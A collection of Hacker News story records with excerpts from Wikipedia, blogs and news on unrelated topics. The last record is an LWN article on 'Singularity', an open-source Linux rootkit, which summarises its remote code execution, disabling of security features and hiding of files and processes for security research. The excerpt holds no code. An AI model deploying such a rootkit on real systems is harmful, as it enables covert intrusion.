{"title": "The longest Greek word", "url": "https://en.wikipedia.org/wiki/Lopado%C2%ADtemacho%C2%ADselacho%C2%ADgaleo%C2%ADkranio%C2%ADleipsano%C2%ADdrim%C2%ADhypo%C2%ADtrimmato%C2%ADsilphio%C2%ADkarabo%C2%ADmelito%C2%ADkatakechy%C2%ADmeno%C2%ADkichl%C2%ADepi%C2%ADkossypho%C2%ADphatto%C2%ADperister%C2%ADalektryon%C2%ADopte%C2%ADkephallio%C2%ADkigklo%C2%ADpeleio%C2%ADlagoio%C2%ADsiraio%C2%ADbaphe%C2%ADtragano%C2%ADpterygon", "content": "The longest Greek word. Lopado­temacho­selacho­galeo­kranio­leipsano­drim­hypo­trimmato­silphio­karabo­melito­katakechy­meno­kichl­epi­kossypho­phatto­perister­alektryon­opto­kephallio­kigklo­peleio­lagoio­siraio­baphe­tragano­pterygonis a fictionaldishoriginating fromAristophanes' 391 BC comedyAssemblywomen,[1]deriving from atransliterationof theAncient Greekwordλοπαδο­τεμαχο­σελαχο­γαλεο­κρανιο­λειψανο­δριμ­υπο­τριμματο­σιλφιο­καραβο­μελιτο­κατακεχυ­μενο­κιχλ­επι­κοσσυφο­φαττο­περιστερ­αλεκτρυον­οπτο­κεφαλλιο­κιγκλο­πελειο­λαγῳο­σιραιο­βαφη­τραγανο­πτερύγων. InA Greek–English Lexicon, it is defined as the \"name of adishcompounded of all kinds ofdainties,fish,flesh,fowl, andsauces\".[2] It is the longest Greek word, containing 171 letters and 78 syllables. The transliteration has 183 Latin characters and is thelongest wordever to appear in literature, according to theGuinness World Records(1990).[3] The form of the word quoted here is the version listed in theLiddell & ScottGreek lexicon (1940) and quoted therein as being amended byAugust Meineke,[2]contrastingF.W. HallandW.M. Geldart's 1907 edition ofAristophanis Comoediae(used in theAssemblywomenplay) variant of (differences underlined):λοπαδο­τεμαχο­σελαχο­γαλεο­κρανιο­λειψανο­δριμ­υποτριμματο­σιλφιο­τυρο­μελιτο­κατακεχυμενο­κιχλεπικοσσυφο­φαττο­περιστερ­αλεκτρυον­οπτεκεφαλλιο­κιγκλο­πελειο­λαγῳο­σιραιο­βαφη­τραγανο­πτερυγώ.[4] The dish was africassée, with at least 16 sweet and sour ingredients, including the following:[3] The term is used in the ultimatechorusof the play, when Blepyrus (and the audience) are summoned to the first feast laid on by the new system. [1167] And you others, let your light steps too keep time.[1168] Very soon we'll be eating[1170]lopado­temacho­selacho­galeo­kranio­leipsano­drim­ypo­trimmato­silphio­karabo­melito­katakechy­meno­kichl­epi­kossypho­phatto­perister­alektryon­opte­kephalio­kigklo­peleio­lagoio­siraio­baphe­tragano­pterygon[sic].[1175] Come, quickly, seize hold of a plate, snatch up a cup, and let's run to secure a place at table. The rest will have their jaws at work by this time. — translation ed. Eugene O'Neill, 1938[1] In English prose translation byLeo Strauss(1966), this Greek word is rendered as \"oysters-saltfish-skate-sharks'-heads-left-over-vinegar-dressing-laserpitium-leek-with-honey-sauce-thrush-blackbird-pigeon-dove-roast-cock's-brains-wagtail-cushat-hare-stewed-in-new-wine-gristle-of-veal-pullet's-wings\".[5] English verse translation byBenjamin Bickley Rogers(1902) follows the original meter and the original form of composition: Plattero-filleto-mulleto-turboto--Cranio-morselo-pickleo-acido--Silphio-honeyo-pouredonthe-topothe--Ouzelo-throstleo-cushato-culvero--Cutleto-roastingo-marowo-dippero--Leveret-syrupu-gibleto-wings.[6]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Cardputer uLisp Machine (2024)", "url": "http://www.ulisp.com/show?52G4", "content": "Cardputer uLisp Machine (2024). Getting started Debugging in uLisp Self-contained Lisp computers 8/16-bit platforms 32/64-bit platforms Simple examples Games Larger examples Graphics examples Wi-Fi examples", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Amazon is ending all inventory commingling as of March 31, 2026", "url": "https://twitter.com/ghhughes/status/2012824754319753456", "content": "Amazon is ending all inventory commingling as of March 31, 2026", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "How to wrangle non-deterministic AI outputs into conventional software? (2025)", "url": "https://www.domainlanguage.com/articles/ai-components-deterministic-system/", "content": "How to wrangle non-deterministic AI outputs into conventional software? (2025). by Eric Evans When we set out to incorporate AI components into larger systems that are mostly conventional software, we encounter various difficulties. How do we wrangle behavior that is intrinsically non-deterministic so that it can be used in structured, deterministic systems? The flexibility of input is great! But the variation of output makes it difficult to do further processing by conventional software. In this simple example I’ll characterize and constrain a non-deterministic result to make it usable in deterministic software. This leads into domain modeling and strategic design. What follows isn’t rocket science, but it is the sort of basics I think we need to apply in order to get results. Let’s start with a use-case I actually have. When I’m trying to get my bearings in a software system, I usually want to know what domains are addressed and in which parts of the code. So imagine an app that would generate that sort of view of a repo: To be concrete, let’s look at the open source project “OpenEMR”. Here’s a very small code sample from that project: We might ask, “what domains are addressed in this code?” Conventional code does not lend itself to that kind of question, but it is a natural use of an LLM. An intelligent answer! But we couldn’t pass that to conventional software for further processing. Of course, we would instruct the LLM to structure and format its output. Okay, so now we have an answer that could be integrated in a technical way. Yet this is will not support the comparisons and hierarchical roll-ups I was hoping for. Because categories are chosen freely in each run, the classification of different files will not be easy to compare. To illustrate the point, I’ll repeat the same question using the same file. Every time I ask question I get a different answer:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Poking holes into bytecode with peephole optimisations", "url": "https://xnacly.me/posts/2026/purple-garden-first-optimisations/", "content": "Poking holes into bytecode with peephole optimisations. This article highlights the first optimizations I made while redesigning and\nsemi-porting the runtime from C to Rust. These aren’t benchmarked or verified,\nsince the virtual machine is currently under construction and will probably be\nfinished this week. At a high level, purple-garden current works like this, with(2+3)*(4-1)as\nan exemplary input: Peephole optimisationsare, as the name implies, optimisations performed on a small section of a\nlarger input. For a virtual machine, like purple-garden this means using a\nwindow of size3(anything larger is no longer local1subject to IR\noptimisation, not peephole and will have happened before peephole optimisation\nis reached in the compilation pipeline) and merging operators, rewriting\nredundant or useless operations. So to summarize: For purple garden specifics and questions regarding the runtime, do consult: Peephole optimisations in purple-garden are intentionally kept single pass to\nkeep startup time cost as low as possible and to move heavy optimisation into\nthe IR. This introduces the problem for recursive optimisations due to the result of a\nprevious optimisation, this is mitigated by peephole optimisations being the\nfallback for the previous optimisation pipeline. Since optimisations can both rewrite, replace and remove instructions, theOp::Nopencodes removal by being the replacement for instructions that were\noptimised away. These are then removed from the bytecode list after all\noptimisations are applied. “Self move” is amovinstruction having equivalentdstandsrc: If this pattern is encountered, the VM would waste processing power on running\naNOPinstruction, to combat this, they are removed:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "If you put Apple icons in reverse it looks like someone getting good at design", "url": "https://mastodon.social/@heliographe_studio/115890819509545391", "content": "If you put Apple icons in reverse it looks like someone getting good at design", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Overlapping Markup", "url": "https://en.wikipedia.org/wiki/Overlapping_markup", "content": "Overlapping Markup. Inmarkup languagesand thedigital humanities,overlapoccurs when a document has two or more structures that interact in a non-hierarchicalmanner.\nA document with overlapping markup cannot be represented as atree.\nThis is also known asconcurrent markup.\nOverlap happens, for instance, inpoetry, where there may be ametricalstructure offeetand lines; a linguistic structure of sentences and quotations; and a physical structure of volumes and pages and editorial annotations.[1][2] The problem of non-hierarchical structures in documents has been recognised since 1988; resolving it against the dominant paradigm of text as a single hierarchy (anordered hierarchy of content objectsorOHCO) was initially thought to be merely a technical issue, but has, in fact, proven much more difficult.[4]In 2008,Jeni Tennisonidentified markup overlap as \"the main remaining problem area for markup technologists\".[5]Markup overlap continues to be a primary issue in the digital study of theological texts in 2019, and is a major reason for the field retaining specialised markup formats—theOpen Scripture Information Standardand theTheological Markup Language—rather than the inter-operableText Encoding Initiative-based formats common to the rest of thedigital humanities.[6] A distinction exists between schemes that allow non-contiguous overlap, and those that allow only contiguous overlap. Often, 'markup overlap' strictly means the latter.\nContiguous overlap can always be represented as a linear document with milestones (typically co-indexed start- and end-markers), without the need for fragmenting a (logical) component into multiple physical ones. Non-contiguous overlap may require document fragmentation. Another distinction in overlapping markup schemes is whether elements can overlap with other elements of the same kind (self-overlap).[2] A scheme may have aprivilegedhierarchy.\nSomeXML-based schemes, for example, represent one hierarchy directly in the XML document tree, and represent other, overlapping, structures by another means;\nthese are said to benon-privileged. Schmidt (2012)identifies a tripartite classification of instances of overlap: 1. \"Variation of content and structure\", 2. \"Overlay of multiple perspectives or markup sets\", and 3. \"Overlap of individual start and end tags within a single markup perspective\";\nadditionally, some apparent instances of overlap are in fact schema definition problems, which can be resolved hierarchically.\nHe contends that type 1 is best resolved by a system of multiple documents external to the markup, but types 2 and 3 require dealing with internally. DeRose (2004, Evaluation criteria) identifies several criteria for judging solutions to the overlap problem: Tag soupis, strictly speaking, not overlapping markup—it is malformedHTML, which is a non-overlapping language, and may be ill-defined.\nSomeweb browsersattempted to represent overlapping start and end tags with non-hierarchicalDocument Object Models(DOM), but this was not standardised across all browsers and was incompatible with the innately hierarchical nature of the DOM.[7][8]HTML5defines how processors should deal with such mis-nested markup in the HTML syntax and turn it into a single hierarchy.[9]WithXHTMLandSGML-based HTML, however, mis-nested markup is a strict error and makes processing by standards-compliant systems impossible.[10]The HTML standard defines aparagraphconcept which can cause overlap with other elements and can be non-contiguous.[11] SGML, which early versions of HTML were based on, has a feature called CONCUR that allows multiple independent hierarchies to co-exist without privileging any.DTDvalidation is only defined for each individual hierarchy with CONCUR. Validation across hierarchies is not defined by the standard. CONCUR cannot support self-overlap, and it interacts poorly with some of SGML's abbreviatory features.\nThis feature has been poorly supported by tools and has seen very little actual use;\nusing CONCUR to represent document overlap was not a recommended use case, according to a commentary by the standard's editor.[12][13] There are several approaches to representing overlap in a non-overlapping language.[14]TheText Encoding Initiative, as an XML-based markup scheme, cannot directly represent overlapping markup.\nAll four of the below approaches are suggested.[15]TheOpen Scripture Information Standardis another XML-based scheme, designed to mark up theBible.\nIt uses empty milestone elements to encode non-privileged components.[16] To illustrate these approaches, marking up the sentences and lines of a fragment ofRichard IIIbyWilliam Shakespearewill be used as a running example. Where there is a privileged hierarchy, the lines will be used.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A Canadian's Call to Arms, Being Pissed Off at the State of Computing", "url": "https://aaron.vegh.ca/2026/01/a-modest-proposal", "content": "A Canadian's Call to Arms, Being Pissed Off at the State of Computing. RSS|JSON I can’t explain to you how angry I am right now. They’ve taken the thing I love most and perverted it. They’ve pervertedeverything. The computers. The Internet. The glorious pocket computer. They used to be loaded with possibility. Now they’re a hard-wire, extracting cash from every spare waking moment. And for those of us who build software, we’ve found ourselves increasingly at the mercy of an oligarchy of companies who constrain the possibilities of the platforms, gatekeeping the relationship we have with customers and limiting the kinds of things we can do on those platforms. But it’s even worse than that. These companies have used their power and influence to centralize the fabric of digital society and the economy, tying it all up in Office 365 and Amazon Web Services. You can choose between Microsoft’s increasingly ad-ridden Windows OS, Apple’s locked-down macOS, or the even-more constrained iOS and Android on mobile. If you want to have a digital life — and let’s face it, you don’t have a choice — it has to be through the platforms mediated by the wealthiest companies ever known in the history of the Earth. Fine, this isn’t news. But here we are in 2026, and it’s become shockingly clear that while the United States is hosting these companies, that country’s policies look increasingly antagonistic to the liberal world order (such as it is). The principles of individual freedom, privacy, human rights, are all under threat. And that’s a funny position to be in, when we’re using their computers, hosting our email on their servers, executing code on their web services, storing our data in their databases. Most governments in Canada and around the world rely on Microsoft’s software. Most businesses route their applications through AWS. Most people tap away their lives on devices built and sold by American businesses, running American operating systems. It’s like waking up and finding yourself ensnared. And it makes me mad as hell! We sleep-walked into this. To go parenthetical for a moment, there’s no guiltier party here than the generations of Canadian governments, and so-called captains of industry, who constantly chose to play small-ball because we could rely on the markets and protection of the US juggernaut beneath us. We made ourselves subsidiary, took the short-term gains over the long-term growth path, and now we’ve well and truly fucked ourselves. Go readMaximum Canadato get more of this argument.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: AWS-doctor – A terminal-based AWS health check and cost optimizer in Go", "url": "https://github.com/elC0mpa/aws-doctor", "content": "Show HN: AWS-doctor – A terminal-based AWS health check and cost optimizer in Go", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Tech Billionaires Behind Trump's Greenland Push", "url": "https://znetwork.org/znetarticle/the-tech-billionaires-behind-trumps-greenland-push/", "content": "The Tech Billionaires Behind Trump's Greenland Push. PresidentDonald Trumpstarted his second term with his sights set on Greenland. When Trump first proposed buying the arctic nation during his first administration, it was treated likea joke. But in aphone calllast week with Denmark’s prime minister, who controls the autonomous territory’s foreign policy, the president doubled down on his efforts to seize power. In the “aggressive and confrontational” conversation, Trumpthreatened tariffsif he didn’t get his way. In a news conference earlier this month, he alsorefusedto rule out the use of military force. Now Denmark is taking him seriously: on Monday, it announced a$2 billionmilitary expansion in the Arctic. Though the island is not for sale, the presidentemphasizedGreenland’s importance to US national security. Left unspoken: a US takeover could weaken the country’s mining laws and ban on private property, aiding Trump donors’ plans to profit from the island’s mineral deposits and build a libertarian techno-city. Trump, who has summarized his own natural resources policy as “drill, baby, drill,” would likely approach the island’s natural resources quite differently from Greenland’s current government, which has opposed large extractive projects. In 2019, Trump’s ambassador to Denmark and Greenlandvisiteda major rare-earth mining project on the island shortly before Trump’s first calls to buy the country. Opposition to the mine ushered liberal political party Inuit Ataqatigiit into power two years later, whichhaltedthe mine andbannedall future oil development. The president’s renewed intention to take over Greenland has reignited debates over its sovereignty, as the country grapples with the trade-offs between economic opportunity and independence from Denmark. As the country’s glaciers recede, it’s also facing sweeping climate-driven transformations, threatening traditional industries like fishing and hunting and exposing valuable mineral resources. These shifts have prompted interest from powerful players associated with Trump. Tech moguls in thefront rowof his inauguration, like Mark Zuckerberg and Jeff Bezos, are also investors in a start-up aiming to mine western Greenland for materials crucial to the artificial intelligence boom. That company,KoBold Metals, uses artificial intelligence to locate and extract rare earth minerals. Their proprietary algorithm parses government-funded geological surveys and other data to locate significant deposits. The program pinpointed southwest Greenland’s rugged coastline, where the company now has a51 percent stakein the Disko-Nuussuaq project, searching for minerals like copper. Just two weeks before some of its investors were glad-handing at the Capitol celebrations, KoBold Metals raised$537 millionin its latest funding round, bringing its valuation to almost $3 billion. Among thecontributorswas a leading venture capital firm founded by Marc Andreessen, an early Silicon Valley entrepreneur who has helped shape the administration’s technology policies, including consulting with Trump’sDepartment of Government Efficiencyas aself-proclaimed“unpaid intern.” “We believe inadventure,”Andreessenwrotein a lengthy 2023 manifesto that outlined his criticisms of centralized government, advocating for technologists to take control, “rebelling against the status quo, mapping uncharted territory, conquering dragons, and bringing home the spoils for our community.” Connie Chan, a general partner at his venture capital firm Andreessen Horowitz, is listed as a KoBold director in its 2022 Securities and Exchange Commissionfiling.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Our collective obsession with boredom: Interview with a boredom lab researcher", "url": "https://nautil.us/why-the-do-nothing-challenge-doesnt-do-much-for-you-1262005/", "content": "Our collective obsession with boredom: Interview with a boredom lab researcher. Boredom lab researcher James Danckert says our collective obsession is misplaced Boredom lab researcher James Danckert says our collective obsession is misplaced The fullNautilusarchive•eBooks & Special Editions•Ad-free reading They sit alone in a room, expressionless, doing absolutely nothing, giant timers clocking down the hours and minutes. No books, no devices, no food, no distractions, no sleep. It’s a challenge some Gen-Zers are setting for themselves on TikTok—the “Do Nothing” challenge. The idea is to deliberately court boredom to restore depleted attention spans, a salve for the frantic overstimulation of our distracted age. Some of these videos accumulate millions of views. It’s a new twist on an old idea. Over a decade ago, South Korean artist Woopsyang started the “Space-Out Competition” to combat burnout. Since then, the urge for stillness has evolved in many forms, including the recent mania for rawdogging, a term that’s come to mean enduring any mundane activity without aids, particularly long flights. That trend became such a sensation that the American Dialect Society choserawdogas its Word of the Year in 2024. What a productive day!#fypシ#challenge#worldrecord#meme#brainrot#sigmagrindset#sigma#antipiracy#vexbolts#unemployment#unemployed#challenges But the Do Nothing challenge and the rawdogging trend suggest a fundamental misunderstanding of how boredom and disconnection work, says James Danckert, a researcher in theBoredom Labat the University of Waterloo. Boredom is closer to hunger than to holiness, he argues, and forcing it on yourself for hours on end doesn’t by itself have restorative power. Instead, the feeling suggests something about your attention, agency, or meaning is out of alignment.I spoke with Danckert about why we’re so fascinated with boredom in this cultural moment, why some people have more trouble with boredom than others, and his frustration with the stubborn idea that boredom is fertile territory for creativity. Why do you think we’re so fascinated by boredom of late? In the early 2000s, we’d start all of our scientific papers with “boredom is an understudied phenomena,” but we can’t do that anymore because in the last 20 years, a lot more people have begun researching it. Some of the recentworkaims to understand the relationship between social media and boredom. You might think that there’s so much at our fingertips now, surely boredom is gonna go away. But what we’re finding is that it’s actually increasing. So one speculation is that our capacity to connect well is diminishing, and as that’s happening, we’re getting more bored. Read more: “What Boredom Does to You”", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Austrian cow shows first case of flexible, multi-purpose tool use in cattle", "url": "https://phys.org/news/2026-01-austrian-cow-case-flexible-multi.html", "content": "Austrian cow shows first case of flexible, multi-purpose tool use in cattle. share this! 103 Tweet Share Email January 19, 2026 byCell Press edited bySadie Harley, \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treviewed byRobert Egan  ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Faster restart of Windows 95 when you hold the shift key", "url": "https://devblogs.microsoft.com/oldnewthing/20260119-06/?p=111995", "content": "Faster restart of Windows 95 when you hold the shift key. Commenter Otul Osan wonderedwhat was happening when the user held theShiftkey when restarting Windows. Windows displays the message “Windows is restarting” rather than doing a full cold restart of the system. The behavior you’re seeing is the result of passingtheEW_RESTART­WINDOWSflagtothe old 16-bitExit­Windowsfunction. What happens is that the 16-bit Windows kernel shuts down, and then the 32-bit virtual memory manager shuts down, and the CPU is put back into real mode, and control returns towin.comwith a special signal that means “Can you start protected mode Windows again for me?” The code inwin.comprints the “Please wait while Windows restarts…” message, and then tries to get the system back into the same state that it was in back whenwin.comhad been freshly-launched. One of the things it has to do is to reset any command line options that had been passed towin.com. This is largely clerical work, but it is rather cumbersome becausewin.comwas written in assembly language. And some global variables need to be reset back to the original values. You might recall that.comfiles are implicitly given all of the remaining available convention memory when they launch. Programs can release that memory back to the system if they want to make it available to other programs. Inwin.com‘s case, it releases all the memory beyond its own image back to the system so that there is a single large contiguous block of memory for loading protected-mode Windows. If somebody had allocated memory in the space thatwin.comhad given up for protected-mode Windows, then convention memory will be fragmented, and the “try to get the system back into the same state that it was in back whenwin.comhad been freshly-launched” is not successful because the expected memory layout was “one giant contiguous block of memory”. In that case,win.comsays, “Sorry, I can’t do what you asked” and falls back to a full reboot. Otherwise, everything looks good, andwin.comjumps back to the code that starts protected-mode Windows, and that re-creates the virtual machine manager, and then the graphical user interface launches, and the user sees that Windows has restarted. Bonus chatter: A common trick in assembly language back in this era when you counted every byte was to take the memory that holds functions that will no longer be called and reuse them as uninitialized data. It’s free memory! In the case ofwin.com, the original code reused the first bytes of the entry point as a global variable since the entry point executes only once. Once you get past the entry point, it’s dead code, so you can put a global variable there! Fortunately, the “fast-restart” case doesn’t jump all the way back to the entry point, so the fact that those instructions were corrupted is not significant.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "East Germany balloon escape", "url": "https://en.wikipedia.org/wiki/East_Germany_balloon_escape", "content": "East Germany balloon escape.  On 16 September 1979, eight people from two families escaped fromEast Germanyby crossing the border intoWest Germanyat night in a homemadehot air balloon. The unique feat was the result of over a year and a half of preparations involving three different balloons, various modifications, and a first, unsuccessful attempt. The failed attempt alerted the East German authorities to the plot, but the police were unable to identify the escapees before their second, successful flight two months later. East Germany, then part of theEastern Bloc, was separated from West Germany in theWestern Blocby theinner German borderand theBerlin Wall, which were heavily fortified withwatchtowers,land mines, armed soldiers, and various other measures to prevent illegal crossings.East German border troopswere instructed to prevent defection to West Germany by all means, including lethal force (Schießbefehl; \"order to fire\").[2] Peter Strelzyk (1942–2017), an electrician and formerEast German Air Forcemechanic, and Günter Wetzel (born 1955), a bricklayer by trade,[3]were colleagues at a local plastics factory.[4]Friends for four years, they shared a desire to flee the country and began discussing ways to get across the border. On 7 March 1978, they agreed to plan an escape.[5]They considered building ahelicopterbut quickly realized they would be unable to acquire an engine capable of powering such a craft. They then decided to explore the idea of constructing a hot air balloon,[6]having been inspired by a television program about ballooning.[3]An alternate account is that a relative shared a magazine article about theInternational Balloon FestivalinAlbuquerque, New Mexico.[5] Strelzyk and Wetzel began research into balloons. Their plan was to escape with their wives and a total of four children (aged 2 to 15). They calculated the weight of the eight passengers and the craft itself to be around 750 kilograms (1,650 lb). Subsequent calculations determined a balloon capable of lifting this weight would need to hold 2,000 cubic metres (71,000 cu ft) of air heated to 100 °C (212 °F). The next calculation was the amount of material needed for the balloon, estimated to be 800 square metres (8,600 sq ft).[6] The pair lived inPößneck, a small town of about 20,000 where large quantities of cloth could not be obtained without raising attention. They tried neighbouring towns ofRudolstadt,Saalfeld, andJenawithout success.[7]They travelled 50 km (31 mi) toGera, where they purchased 1-metre-wide (3 ft 3 in) rolls of cotton cloth totalling 850 metres (2,790 ft) in length at a department store after telling the astonished clerk that they needed the large quantity of material to use as tent lining for their camping club.[6][7] Wetzel spent two weeks sewing the cloth into a balloon-shaped bag, 15 metres (49 ft) wide by 20 metres (66 ft) long, on a 40-year-old manually operated sewing machine. Strelzyk spent the time building the gondola and burner assembly. The gondola was made from an iron frame,sheet metalfloor, and clothesline run around the perimeter every 150 millimetres (5.9 in) for the sides. The burner was made using two 11-kilogram (24 lb) bottles ofliquid propanehousehold gas, hoses, water pipe, a nozzle, and a piece of stove pipe.[6] The team was ready to test the craft in April 1978. After days of searching, they found a suitable secluded forest clearing nearZiegenrück, 10 km (6.2 mi) from the border and 30 km (19 mi) fromPößneck. After lighting the burner one night, they failed to inflate the balloon. They thought the problem might stem from the fact that they had laid the balloon on the ground. After weeks of additional searching, they found a 25-metre (82 ft) cliff at a rock quarry where they could suspend the balloon vertically before inflation, but that also proved unsuccessful.[6] The pair then decided to fill the bag with ambient-temperature air before using the burner to raise the air temperature and provide lift. They constructed a blower with a 14 hp (10 kW) 250 cc (15 cu in) motorcycle engine taken from Wetzel's oldMZ, started with aTrabantautomobile starter powered byjumper cablesfrom Strelzyk'sMoskvitchsedan.[8]This engine, silenced by a Trabantmuffler, turned 1-metre-long (3.3 ft) fan blades to inflate the balloon. They also used a home-madeflamethrower, similar to the gondola's burner, to pre-heat the air faster. With these modifications in place, they returned to the secluded clearing to try again but still could not inflate the balloon. But using the blower did allow them to discover that the cotton material with which they fashioned the balloon was too porous and leaked excessively.[6] Their unsuccessful effort had cost them 2,400DDM(US$360). Strelzyk disposed of the cloth by burning it in his furnace over several weeks.[6]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Antarctic penguins have shifted their breeding season", "url": "https://www.theguardian.com/world/2026/jan/20/antarctic-penguins-shift-breeding-season-climate-change", "content": "Antarctic penguins have shifted their breeding season. Changing temperatures may be behind change in behaviour, which experts fear threatens three species’ survival Penguins inAntarcticahave radically shifted their breeding season, apparently as a response to climate change, research has found. Dramatic shifts in behaviour were revealed by a decade-long study led byPenguinWatch at the University of Oxford and Oxford Brookes University, with some penguins’ breeding period moving forward by more than three weeks. The changes threaten to disrupt penguins’ access to food, increasing concerns for their survival. “We are very concerned because these penguins are advancing their season so much, and penguins are now breeding earlier than in any known records,” said the report’s lead author, Dr Ignacio Juarez Martínez. “The changes are happening so fast that the penguins could end up breeding at times when their prey is not available yet. This could result in a lack of food for the penguin chicks in the first weeks of their life, which could be fatal. Even if the penguins could match their prey’s behaviour, we can’t expect them to keep this pace up much longer.” The researchers examined changes in the timing of penguin breeding between 2012 and 2022, specifically their “settlement” at a colony – the first date at which penguins continuously occupied a nesting zone. Three species – Adélie (Pygoscelis adeliae), chinstrap (Pantarcticus) and gentoo (Ppapua) – were studied, with colony sizes ranging from a dozen nests up to hundreds of thousands of nests. The scientists gathered evidence from 77 time-lapse cameras positioned around 37 colonies in Antarctica and some sub-Antarctic islands. Every time a camera took a picture, it also recorded the air temperature. The results, published on Tuesday in the Journal of Animal Ecology, show that the timing of the breeding season for all three species advanced at record rates. Gentoo penguins showed the greatest change, with an average advance of 13 days over the decade and up to 24 days in some gentoo colonies. This represents the fastest change in phenology (timing of breeding) recorded in any bird, and possibly any vertebrate, to date. Adélie and chinstrap penguins also advanced their breeding by an average of 10 days. Such drastic changes also threaten to increase competition between the region’s penguin species, with clear “winners” and “losers” expected.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Why I Stopped Using Nbdev", "url": "https://hamel.dev/blog/posts/ai-stack/", "content": "Why I Stopped Using Nbdev. Programmers love to proclaim they’ve found the best tool. Paul Graham called Lisp his “secret weapon.” DHH described Ruby as “a magical glove that just fit my brain perfectly.” Pieter Levels ships million-dollar products withvanilla PHP and jQuery. These declarations aren’t about the languages themselves. They’re about developers finding tools that fit how they think. When the environment clicks, you move fast. I had that experience withnbdev, a development environment for literate programming that I helped build and maintain1. I created hundreds of projects with it and was one of itsbiggestproponents. Today, I no longer use it. AI coding tools changed the trade-offs. The beauty of nbdev is its workflow. You write code, documentation and tests in one source of truth: Jupyter notebooks. Afterwards, these notebooks are transpiled into a Python library and documentation website. This workflow is idiosyncratic. AI coding tools, trained on vast amounts of conventional source code, get confused. They struggle to differentiate between editing the notebook and editing the final source code. It feels like fighting the AI instead of working with it. I write software to solve problems, not to write code. I want to work in an environment where AI has the highest chance of success. With nbdev, I was swimming upstream. Some argue that AI tools encourage lazy thinking: that without guardrails, developers skip the hard work of breaking problems into steps. But thinking step-by-step is a human skill. Notebooks don’t force you to write clean code. AI tools don’t force you to think carefully. Discipline comes from the developer, not the environment. A central promise of literate programming is better documentation. By keeping code and docs in one place, you reduce the chance they become stale. Strangely, many nbdev projects lacked sufficient documentation for my taste. Sometimes, this helped me learn a codebase bycontributingto the docs. Other times, it was frustrating. This reinforced my belief that good documentation comes from effort, not tooling.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Cloudflare acquires Astro", "url": "https://astro.build/blog/joining-cloudflare/", "content": "Cloudflare acquires Astro. The Astro Technology Company — the company behind the Astro web framework — is joining Cloudflare! Adoption of the Astro web framework continues to double every year, andAstro 6is right around the corner. With Cloudflare’s support, we’ll have more resources and fewer distractions to continue our mission to build the best framework for content-driven websites. What this means for Astro: In 2021, Astro was born out of frustration. The trend at the time was that every website should be architected as an application, and then shipped to the user’s browser to render. This was not very performant, and we’ve spent the last decade coming up with more and more complex solutions to solve for that performance problem. SSR, ISR, RSC, PPR, TTI optimizations via code-splitting, tree-shaking, lazy-loading, all to generate a blocking double-data hydration payload from a pre-warmed server running halfway around the world. Our mission to design a web framework specifically for building websites — what we callcontent-driven websites,to better distinguish from data-driven, stateful web applications — resonated. Now Astro is downloaded almost 1,000,000 times per week, and has been used by 100,000s of developers to build fast, beautiful websites. Today you’ll find Astro all over the web, powering major websites and even entire developer platforms for companies like Webflow, Wix, Microsoft, and Google. Along the way, we also tried to grow a business.In 2021 we raised some money and formedThe Astro Technology Company. Our larger vision was that a well-designed framework like Astro could sit at the center of a massive developer platform, with optional hosted primitives (database, storage, analytics) designed in lockstep with the framework. We were never able to realize this vision. Attempts to introduce paid, hosted primitives into our ecosystem fell flat, and rarely justified their own existence. We considered going more directly after first-class hosting or content management for Astro, but knew we’d spend much of our time playing catchup to well-funded, savvy competitors. We kept exploring different ideas, but nothing clicked with users the same way Astro did. It wasn’t all bad.Astro DB(our attempt to build a hosted database product for Astro projects) eventually evolved into the open, built-in Astro database client that still lives in core today. Our exploration into building an e-commerce layer with Astro was eventuallyopen-sourced. It was rewarding work, but over the years the distraction took its toll. Each attempt at a new paid product or offering took myself and others on the project away from working on the Astro framework that developers were using and loving every day. Last year, Dane (Cloudflare CTO) and I began to talk more seriously about the future of the web. Those conversations quickly grew into something bigger: What does the next decade look like? How do frameworks adapt to a world of AI coding and agents? It became clear that even as web technologies evolve,content remains at the center.We realized that we’ve each been working toward this same vision from different angles: The overlap is obvious. By working together, Cloudflare gives us the backing we need to keep innovating for our users. Now we can stop spending cycles worrying about building a business on top of Astro, and start focusing 100% on the code, with a shared vision to move the web forward.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Beats, a web-based drum machine", "url": "https://beats.lasagna.pizza", "content": "Show HN: Beats, a web-based drum machine.     Share your beat with this URL: BEATS A web-based drum machine inspired by theTeenage EngineeringPocket Operators. CREDITS: • Wrote by@kinduff • Built with Tone.js and Stimulus.js", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A free and open-source rootkit for Linux", "url": "https://lwn.net/SubscriberLink/1053099/19c2e8180aeb0438/", "content": "A free and open-source rootkit for Linux. While there are several rootkits that target Linux, they have so far not fully\nembraced the open-source ethos typical of Linux software.\nLuckily, Matheus Alves has been working to remedy\nthis lack by creatingan open-source rootkit called Singularityfor Linux systems. Users who feel\ntheir computers are too secure can install the Singularity kernel module in\norder to allow remote code execution, disable security features, and hide files\nand processes from normal administrative tools. Despite its many features,\nSingularity is not currently known to be in use in the wild — instead, it\nprovides security researchers with a testbed to investigate new detection and\nevasion techniques. Alves is quite emphatic about the research nature of Singularity, saying that\nits main purpose is to help drive security research forward by demonstrating\nwhat is currently possible. Hecallsfor anyone using the software to \"be a\nresearcher, not a criminal\", and to test it only on systems where they have\nexplicit permission to test. If one did wish to use Singularity for nefarious\npurposes, however, the code is MIT licensed and freely available — using it in\nthat way would only be a crime, not an instance of copyright infringement. The whole problem of how to obtain\nroot permissions on a system and go about installing a kernel module is out of\nscope for Singularity; its focus is on how to maintain an undetected presence\nin the kernel once things have already been compromised. In order to do this,\nSingularity goes to a lot of trouble to present the illusion that the 